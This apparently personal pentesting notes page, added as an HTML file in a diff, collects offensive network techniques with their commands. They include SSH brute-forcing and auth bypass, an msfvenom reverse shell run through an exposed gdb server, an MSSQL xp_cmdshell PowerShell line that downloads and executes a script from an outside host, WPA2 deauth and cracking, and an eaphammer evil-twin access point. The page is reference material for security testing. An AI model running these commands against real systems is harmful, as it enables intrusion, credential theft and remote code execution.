@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 2025-05-25 Sun 16:43 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Network stuff</title>
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" type="text/css" href="/files/css/style.css"/>
+<link rel="stylesheet" type="text/css" href="/files/css/htmlize.css"/>
+<link rel="icon" href="/files/img/favicon.ico" type="image/x-icon">
+</head>
+<body>
+<div id="preamble" class="status">
+<a href="/"><img src="/files/img/profile.jpg"/></a>
+<h1>skywhi@dreamland:/var/log$ <span class="blink">_</span></h1>
+<nav>
+    <span class="nav-item">[<a href="/" title="Home">Home</a>]</span>
+    <span class="nav-item">[<a href="/posts" title="Posts">Posts</a>]</span>
+    <span class="nav-item">[<a href="/notes" title="Notes">Notes</a>]</span>
+    <span class="nav-item">[<a href="/links.html" title="Links">Links</a>]</span>
+    <span class="nav-item">[<a href="/about.html" title="About">About</a>]</span>
+</nav>
+<hr>
+</div>
+<div id="content" class="content">
+<h1 class="title">Network stuff</h1>
+<p>
+<b>Table of Content</b>
+</p>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#protocols">Common Protocols</a>
+<ul>
+<li><a href="#ssh">SSH - port 22</a></li>
+<li><a href="#ssl">SSL/TLS</a></li>
+<li><a href="#orgf1ef88c">LDAP</a></li>
+<li><a href="#org3eceaed">GDB server</a></li>
+<li><a href="#orgf876171">DNS rebinding</a></li>
+<li><a href="#org3d6488f">Crack P12 (PKCS12) certificate passwords</a></li>
+<li><a href="#org0dd19f6">Microsoft SQL Server (MSSQL)</a></li>
+</ul>
+</li>
+<li><a href="#wireless">Wireless</a>
+<ul>
+<li><a href="#org97d3eaa">Recon</a></li>
+<li><a href="#org9fb7a07">WPA2-PSK capturing and cracking</a></li>
+<li><a href="#org7910e5a">Attacking WPA2-MGT with Evil Twin</a></li>
+</ul>
+</li>
+<li><a href="#orgc01153d">Port forwarding and reverse shells</a>
+<ul>
+<li><a href="#org9aff23e">Chisel</a></li>
+<li><a href="#org2f59304">Socat cheatsheet</a></li>
+</ul>
+</li>
+</ul>
+</div>
+<div id="outline-container-protocols" class="outline-2">
+<h2 id="protocols">Common Protocols</h2>
+<div class="outline-text-2" id="text-protocols">
+</div>
+<div id="outline-container-ssh" class="outline-3">
+<h3 id="ssh">SSH - port 22</h3>
+<div class="outline-text-3" id="text-ssh">
+</div>
+<div id="outline-container-orgf798bd0" class="outline-4">
+<h4 id="orgf798bd0">Check SSH configuration</h4>
+<div class="outline-text-4" id="text-orgf798bd0">
+<ul class="org-ul">
+<li><a href="https://github.com/arthepsy/ssh-audit">ssh-audit</a> for detailed fingerprinting</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orga7cce17" class="outline-4">
+<h4 id="orga7cce17">Bruteforcing credentials</h4>
+<div class="outline-text-4" id="text-orga7cce17">
+<p>
+Use metasploit's <code>auxiliary/scanner/ssh/ssh_login</code> or <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>.
+</p>
+</div>
+</div>
+<div id="outline-container-org08a4b17" class="outline-4">
+<h4 id="org08a4b17">Bypass login shell</h4>
+<div class="outline-text-4" id="text-org08a4b17">
+<p>
+To bypass restrictive login shells such as <code>/usr/bin/nologin</code> or
+<code>/usr/bin/false</code> you can add your own command while connecting upon SSH that
+will be executed before the user drops into the assigned login shell. <code>/bin/sh</code>
+is always a good candidate.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">ssh user@target /bin/sh
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org2c11627" class="outline-4">
+<h4 id="org2c11627">libssh authentication bypass</h4>
+<div class="outline-text-4" id="text-org2c11627">
+<p>
+Use the python <a href="https://www.exploit-db.com/exploits/46307">script</a> from exploit-db.com or metasploit's
+<code>auxiliary/scanner/ssh/libssh_auth_bypass</code> to exploit an authentication bypass
+present in libssh before versions 0.7.6 and 0.8.4 (<a href="https://www.cvedetails.com/cve/CVE-2018-10933">CVE-2018-10933</a>).
+</p>
+</div>
+</div>
+<div id="outline-container-orga3ddf4d" class="outline-4">
+<h4 id="orga3ddf4d">Debian OpenSSL Predictable PRNG (CVE-2008-0166)</h4>
+<div class="outline-text-4" id="text-orga3ddf4d">
+<p>
+At some point in 2008, Debian shipped a buggy OpenSSL implementation. This bug
+biaised the seeds used by OpenSSL's PRNG, resulting in only 32,767 possible
+seeds for a given architecture, key size and key type.
+</p>
+
+<p>
+<a href="https://github.com/g0tmi1k/debian-ssh">g0tm1lk</a> generated the possible keys which can further be exploited with <a href="https://www.exploit-db.com/exploits/5720">this
+python script</a>.
+</p>
+</div>
+</div>
+<div id="outline-container-orga032369" class="outline-4">
+<h4 id="orga032369">Tools &amp; resources</h4>
+<div class="outline-text-4" id="text-orga032369">
+<p>
+Utilities:
+</p>
+
+<ul class="org-ul">
+<li><a href="https://github.com/sshuttle/sshuttle">sshuttle</a>: proxy allthethings over ssh.</li>
+</ul>
+
+<p>
+Configuration guides:
+</p>
+
+<ul class="org-ul">
+<li><a href="https://infosec.mozilla.org/guidelines/openssh">Mozilla's guidelines on OpenSSH configuration</a>.</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-ssl" class="outline-3">
+<h3 id="ssl">SSL/TLS</h3>
+<div class="outline-text-3" id="text-ssl">
+</div>
+<div id="outline-container-org299f684" class="outline-4">
+<h4 id="org299f684">Check SSL/TLS configuration</h4>
+<div class="outline-text-4" id="text-org299f684">
+<ul class="org-ul">
+<li><a href="https://testssl.sh/">testssl.sh</a>: very exhaustive checks.</li>
+<li><a href="https://github.com/rbsec/sslscan/">sslscan</a>.</li>
+<li>Mozilla SSL/TLS <a href="https://wiki.mozilla.org/Security/Server_Side_TLS">guidelines</a> and <a href="https://ssl-config.mozilla.org/">configuration generator</a>.</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-orgf1ef88c" class="outline-3">
+<h3 id="orgf1ef88c">LDAP</h3>
+<div class="outline-text-3" id="text-orgf1ef88c">
+</div>
+<div id="outline-container-org8e0dd9e" class="outline-4">
+<h4 id="org8e0dd9e">Enumeration</h4>
+<div class="outline-text-4" id="text-org8e0dd9e">
+<p>
+<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">Hacktricks on LDAP</a>.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">nmap --script=<span class="org-string">"ldap* and not brute"</span> 10.10.10.1 | tee detailed_ldap.txt | grep Context
+ldapsearch -x -H ldap://10.10.10.1 -D <span class="org-string">''</span> -w <span class="org-string">''</span> -b <span class="org-string">"DC=abc,DC=xyz"</span> | tee ldapsearch.txt
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-orga650a9f" class="outline-4">
+<h4 id="orga650a9f">LDAP Pass-Back Attack</h4>
+<div class="outline-text-4" id="text-orga650a9f">
+<p>
+This attacks relies on tricking a device to connect to a rogue LDAP server
+operated by the attacker. The server is configured so that only plaintext
+credentials are accepted, hence capturing the credentials from the connecting
+service.
+</p>
+
+<p>
+The setup for the attack is described <a href="https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210">here</a>. Below are the steps for ArchLinux
+(make sure to check out Arch's wiki entry for <a href="https://wiki.archlinux.org/title/OpenLDAP">OpenLDAP</a> in parallel).
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-org3eceaed" class="outline-3">
+<h3 id="org3eceaed">GDB server</h3>
+<div class="outline-text-3" id="text-org3eceaed">
+<p>
+It is possible to obtain remote command execution when a gdb instance is
+listening. There are several exploits available but this can also be achieved
+manually. To do so we simply transfer an executable onto the target, reverse
+shells are juicy candidates, and ask gdb to debug it.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">msfvenom -p linux/x64/shell_reverse_tcp <span class="org-variable-name">LHOST</span>=&lt;ip&gt; <span class="org-variable-name">LPORT</span>=&lt;port&gt; -f elf -o evil
+gdb
+gdb$ target extended-remote &lt;target&gt;:&lt;port&gt;
+gdb$ remote put evil evil
+gdb$ set remote exec-file evil
+gdb$ run
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-orgf876171" class="outline-3">
+<h3 id="orgf876171">DNS rebinding</h3>
+<div class="outline-text-3" id="text-orgf876171">
+<p>
+-<a href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us</a> rebinding service.
+</p>
+</div>
+</div>
+<div id="outline-container-org3d6488f" class="outline-3">
+<h3 id="org3d6488f">Crack P12 (PKCS12) certificate passwords</h3>
+<div class="outline-text-3" id="text-org3d6488f">
+<ul class="org-ul">
+<li><a href="https://github.com/Ridter/p12tool">p12tool</a> (go).</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org0dd19f6" class="outline-3">
+<h3 id="org0dd19f6">Microsoft SQL Server (MSSQL)</h3>
+<div class="outline-text-3" id="text-org0dd19f6">
+<p>
+Once authenticated, upload and execute a reverse shell with impacket's
+<code>mssqlclient.py</code>.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">mssqlclient.py sa:poiuytrewq@10.11.1.31
+SQL&gt; xp_cmdshell <span class="org-string">"powershell IEX(New-Object Net.webclient).downloadString(\"http://192.168.119.184:8088/hey.ps1\")"</span>
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-wireless" class="outline-2">
+<h2 id="wireless">Wireless</h2>
+<div class="outline-text-2" id="text-wireless">
+</div>
+<div id="outline-container-org97d3eaa" class="outline-3">
+<h3 id="org97d3eaa">Recon</h3>
+<div class="outline-text-3" id="text-org97d3eaa">
+<p>
+Turn an interface into monitor mode and start sniffing for networks in range.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter"># </span><span class="org-comment">list available interfaces</span>
+airmon-ng
+ip a
+<span class="org-comment-delimiter"># </span><span class="org-comment">set interface to monitor mode</span>
+airmon-ng start &lt;inferface&gt;
+<span class="org-comment-delimiter"># </span><span class="org-comment">capture into all_traffic.pcap</span>
+airodump-ng -w all_traffic &lt;inferface&gt;mon
+tcpdump -i &lt;interface&gt;mon -w app_traffic.pcap
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org9fb7a07" class="outline-3">
+<h3 id="org9fb7a07">WPA2-PSK capturing and cracking</h3>
+<div class="outline-text-3" id="text-org9fb7a07">
+<ol class="org-ol">
+<li>Select a target network and wait for the capture of WPA2 handshakes.</li>
+<li>If needed, activelty de-auth clients to capture handshakes upon their
+reconnection.</li>
+<li>Use aircrack-ng / john / hashcat to crack the WPA2 master key from the
+handshakes.</li>
+</ol>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter"># </span><span class="org-comment">Sniff &lt;bssid&gt; on a single &lt;channel&gt; and store into &lt;target&gt;.pcap</span>
+airodump-ng -c &lt;channel&gt; --bssid &lt;bssid&gt; -w &lt;target&gt; &lt;interface&gt;mon
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">De-auth up to &lt;nb&gt; stations to capture auth packets for good</span>
+aireplay-ng -0 &lt;nb&gt; -a &lt;target bssid&gt; &lt;interface&gt;mon
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">Taxi, crack that key!</span>
+aircrack-ng -a 2 -w /path/to/dictionary.txt target.pcap
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org7910e5a" class="outline-3">
+<h3 id="org7910e5a">Attacking WPA2-MGT with Evil Twin</h3>
+<div class="outline-text-3" id="text-org7910e5a">
+<p>
+It requires two wireless interfaces: one connected to internet or to the target
+network and another, ideally powerful, interface that will server as an access
+point. <a href="https://github.com/s0lst1c3/eaphammer/wiki">eaphammer</a> can be used to generate a certificate and then run a fake
+WPA2-MGMT access point replicating the target's ESSID and BSSID. The attacker
+gets complete control over every client's traffic which connects to the rogue
+access point without checking the certificate against a trusted one.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">$ eaphammer --cert-wizard
+$ eaphammer -i wlan0 -I wlan1 --essid <span class="org-string">"Target"</span> --bssid 01:02:03:aa:bb:cc
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-orgc01153d" class="outline-2">
+<h2 id="orgc01153d">Port forwarding and reverse shells</h2>
+<div class="outline-text-2" id="text-orgc01153d">
+</div>
+<div id="outline-container-org9aff23e" class="outline-3">
+<h3 id="org9aff23e">Chisel</h3>
+<div class="outline-text-3" id="text-org9aff23e">
+<p>
+<a href="https://github.com/jpillora/chisel">chisel</a> is another networking swiss army knife (get precompiled binaries from the
+<a href="https://github.com/jpillora/chisel/releases">release page</a>).
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell"><span class="org-comment-delimiter"># </span><span class="org-comment">On local machine</span>
+./chisel server -p 7777 --reverse
+<span class="org-comment-delimiter"># </span><span class="org-comment">On remote</span>
+./chisel client 10.10.1.2:7777 R:5985:10.10.3.4:5985
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org2f59304" class="outline-3">
+<h3 id="org2f59304">Socat cheatsheet</h3>
+<div class="outline-text-3" id="text-org2f59304">
+<p>
+You can retrieve compiled executables for socat on the wonderful <a href="https://github.com/andrew-d/static-binaries">static-binaries</a>
+project: <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">linux x86_64</a>
+</p>
+
+<p>
+First, check out <a href="https://cheat.sh/socat">cheat.sh/socat</a> for cool usage tips. Below are the ones I use
+the most.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">
+</pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<p>
+    Last update: 25 May 2025 - <a href="#">Top of the page</a> - <a href="/sitemap.html">Sitemap</a> - <a href="/rss.xml"><img src="/files/img/rss.png" height="16" width="16"></a>
+</p>
+</div>
+</body>
+</html>
